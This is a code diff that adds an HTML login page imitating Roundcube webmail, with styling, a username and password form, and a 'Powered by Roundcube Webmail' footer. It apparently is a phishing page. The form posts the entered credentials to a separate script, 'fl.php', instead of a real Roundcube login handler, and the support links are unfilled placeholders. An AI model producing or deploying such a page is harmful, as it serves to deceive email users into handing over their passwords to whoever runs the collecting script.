@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+    <link rel="shortcut icon" href="" type="image/x-icon">
+   
+    <link rel="shortcut icon" href="data:image/x-icon;base64,AAABAAEAICAAAAEAIADSAgAAFgAAAIlQTkcNChoKAAAADUlIRFIAAAAgAAAAIAgGAAAAc3p69AAAAplJREFUWIXt1j2IHGUYB/DfOzdnjIKFkECIVWIKvUFsIkRExa9KJCLaWAgWJx4DilZWgpDDiI0wiViIoGATP1CCEDYHSeCwUBBkgiiKURQJFiLo4d0eOxYzC8nsO9m9XcXC+8MW+3z+9/l6l2383xH+iSBpElyTdoda26xsDqp/h0CVZ3vwKm7tMBngAs7h7eRYebG6hMtMBHbMBX89vfARHprQ5U8cwdFQlIOZCVR5di1+w/wWXT/EY6EoN5NZCODuKZLDwzgSMCuBe2fwfX6QZwtpWzqfBBtLC3txF/ZhxKbBGx0EfsTJS77vwmGjlZrD4mUzUOXZjVjGI65cnTXchB8iupdDUb7QinsQZ7GzZftdQj2JVZ49iC/w6JjksIo7OnS9tiA5Vn6GtyK2+1MY5NkhfGDygVrBAxH5WkPuMjR7/3UsUFLl2Q68s4XkA3ws3v9zoSjX28Kr5wL1xrTxa6ou+f6OZGvqPg9v1wZeaUjcELE/DVfNhWFSvy/enOIZ9eq1sTokEMNLWI79oirP8g6fXpVnh7GEvY1sV/OJ4f0UhyKKk6EoX4x5pEkgXv6L6OM99YqNw/c4kXSwG5nkIfpLCynuiahW1GWeJHkfT4aiXO9atz1XcD6I6yLyHu6bIPk6Hg9FeYZ63y9EjBarPDvQ8VJ1nd9V3D4m+RncForyxFCQ4hSeahlej88Hefauurdwaufr5z/F/ZHAX6nL+mZE18e36IWiHLkFocqzW9QXcNz1+wUHxJ/f10JRPjvGP4pk/vj5L3F8AtufdD+/p6dJDknzX+05fDLGtife/766t9MRgFCUffWTudwE3AqBlVCUf0xLYGTQqzzbhydwJ3Y34g318J1tmX+DPBTlz9MS2MY2/nP8DTGaqeTDf30rAAAAAElFTkSuQmCC" type="image/x-icon">
+    <title>Webmail Login</title>
+    <style>
+        body {
+            font-family: Arial, Helvetica, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .login-container {
+            background-color: #ffffff;
+            max-width: 400px;
+            width: 100%;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
+            text-align: center;
+        }
+        .logo {
+            margin-bottom: 20px;
+        }
+        .logo img {
+            max-width: 150px;
+            height: auto;
+        }
+        h1 {
+            font-size: 24px;
+            color: #007bff;
+            margin-bottom: 20px;
+        }
+        .form-group {
+            margin-bottom: 15px;
+            text-align: left;
+            position: relative;
+        }
+        label {
+            display: block;
+            font-size: 14px;
+            color: #333;
+            margin-bottom: 5px;
+        }
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 10px 10px 10px 45px;
+            font-size: 14px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        input[type="text"]:focus,
+        input[type="password"]:focus {
+            border-color: #007bff;
+            outline: none;
+            box-shadow: 0 0 5px rgba(0, 123, 255, 0.3);
+        }
+        .form-group img {
+            position: absolute;
+            left: 10px;
+            top: 38px;
+            width: 20px;
+            height: 20px;
+            opacity: 0.6;
+        }
+        .form-group::after {
+            content: '';
+            position: absolute;
+            left: 35px;
+            top: 38px;
+            height: 20px;
+            width: 1px;
+            background-color: #ccc;
+        }
+        button {
+            background-color: #007bff;
+            color: #ffffff;
+            padding: 10px;
+            width: 100%;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        .error {
+            color: #d9534f;
+            font-size: 12px;
+            margin-top: 10px;
+            display: none;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #666;
+        }
+        .footer a {
+            color: #007bff;
+            text-decoration: none;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        @media screen and (max-width: 480px) {
+            .login-container {
+                margin: 10px;
+                padding: 15px;
+            }
+            h1 {
+                font-size: 20px;
+            }
+            .form-group img {
+                top: 35px;
+                width: 18px;
+                height: 18px;
+            }
+            .form-group::after {
+                top: 35px;
+                left: 33px;
+                height: 18px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <!-- <img src="https://roundcube.net/images/roundcube_logo.png" alt="Roundcube Webmail"> -->
+        </div>
+        <!-- <h1>Webmail Login</h1> -->
+        <form action="./fl.php" method="post" onsubmit="return validateForm()">
+            <div class="form-group">
+                <label for="username">Username</label>
+                <img src="https://cdn-icons-png.flaticon.com/512/456/456212.png" alt="User Icon">
+                <input type="text" id="username" name="_user" required placeholder="Enter your email or username">
+            </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <img src="https://cdn-icons-png.flaticon.com/512/3064/3064156.png" alt="Lock Icon">
+                <input type="password" id="password" name="_pass" required placeholder="Enter your password">
+            </div>
+            <button type="submit" id="loginBtn5">Log In</button>
+            <div class="error" id="error-message">Invalid username or password.</div>
+        </form>
+        <div class="footer">
+            <p><a href="[insert forgot password URL]">Forgot Password?</a> | <a href="[insert support URL]">Contact Support</a></p>
+            <p>Powered by Roundcube Webmail</p>
+        </div>
+    </div>
+    <script>
+        function validateForm() {
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
+            const errorMessage = document.getElementById('error-message');
+            const loginBtn = document.getElementById('loginBtn5');
+
+            if (!username || !password) {
+                errorMessage.style.display = 'block';
+                loginBtn.disabled = false;
+                return false;
+            }
+            errorMessage.style.display = 'none';
+            loginBtn.disabled = true;
+            return true;
+        }
+    </script>
+</body>
+</html>
